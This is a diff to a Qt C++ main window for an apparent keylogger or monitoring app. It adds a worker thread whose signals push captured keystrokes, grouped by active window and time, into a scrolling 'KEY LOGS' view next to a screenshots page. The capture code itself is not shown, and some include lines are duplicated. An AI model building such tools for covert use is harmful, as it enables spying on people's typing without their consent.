@@ -5,7 +5,14 @@
 #include <QFrame>
 #include <QMovie>
 #include <QResizeEvent>
-
+#include "MainWindow.hpp"
+#include <QDebug>
+#include <QHBoxLayout>
+#include <QPixmap>
+#include <QFrame>
+#include <QMovie>
+#include <QResizeEvent>
+#include <QScrollBar>
 MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent) {
     setupUi();
@@ -27,9 +34,19 @@ MainWindow::MainWindow(QWidget *parent)
     fadeAnimation->setEasingCurve(QEasingCurve::InOutSine);
     fadeAnimation->setLoopCount(-1); 
     fadeAnimation->start();
+
+    workerThread = new WorkerThread();
+    connect(workerThread, &WorkerThread::windowChanged, this, &MainWindow::onWindowChanged);
+    connect(workerThread, &WorkerThread::keyPressed, this, &MainWindow::onKeyPressed);
+    workerThread->start();
 }
 
 MainWindow::~MainWindow() {
+    if (workerThread->isRunning()) {
+        workerThread->terminate(); 
+        workerThread->wait();
+    }
+    delete workerThread;
 }
 
 void MainWindow::setupUi() {
@@ -126,19 +143,28 @@ void MainWindow::setupUi() {
     // Page 1: Key Logs
     QWidget *logsPage = new QWidget(this);
     QVBoxLayout *logsLayout = new QVBoxLayout(logsPage);
-    logsLayout->setAlignment(Qt::AlignCenter);
+    logsLayout->setContentsMargins(30, 0, 30, 0); 
     
     QLabel *logsTitle = new QLabel("KEY LOGS", this);
     logsTitle->setStyleSheet("font-size: 48px; font-weight: bold; color: #FF0090;");
     logsTitle->setAlignment(Qt::AlignCenter);
     
-    QLabel *logsDesc = new QLabel("Keystroke logs will appear here", this);
-    logsDesc->setStyleSheet("font-size: 18px; color: #666;");
-    logsDesc->setAlignment(Qt::AlignCenter);
-    
     logsLayout->addWidget(logsTitle);
     logsLayout->addSpacing(20);
-    logsLayout->addWidget(logsDesc);
+
+    
+    logScrollArea = new QScrollArea(this);
+    logScrollArea->setWidgetResizable(true);
+    logScrollArea->setStyleSheet("background: transparent; border: none;");
+    
+    logContainer = new QWidget();
+    logContainer->setStyleSheet("background: transparent;");
+    logContainerLayout = new QVBoxLayout(logContainer);
+    logContainerLayout->setAlignment(Qt::AlignTop);
+    logContainerLayout->setSpacing(20);
+    
+    logScrollArea->setWidget(logContainer);
+    logsLayout->addWidget(logScrollArea);
     
     // Page 2: Screenshots
     QWidget *screenshotsPage = new QWidget(this);
@@ -254,6 +280,31 @@ void MainWindow::switchToPage(int index) {
     pageTransition->setStartValue(1.0);
     pageTransition->setEndValue(0.0);
     pageTransition->start();
+
+}
+
+void MainWindow::onWindowChanged(const QString& name, const QString& time) {
+    if (currentBlock && currentBlock->isEmpty()) {
+        currentBlock->markNoInput();
+    }
+
+    currentBlock = new KeyLogBlock(name, time, logContainer);
+    logContainerLayout->addWidget(currentBlock);
+    
+    QScrollBar *sb = logScrollArea->verticalScrollBar();
+    sb->setValue(sb->maximum());
+}
+
+void MainWindow::onKeyPressed(const QString& text) {
+    if (!currentBlock) {
+        onWindowChanged("Unknown Window", "00:00:00");
+    }
+    currentBlock->appendLog(text);
+    
+    QScrollBar *sb = logScrollArea->verticalScrollBar();
+    if (sb->value() > sb->maximum() - 100) {
+        sb->setValue(sb->maximum());
+    }
 }
 
 void MainWindow::applyStyles() {
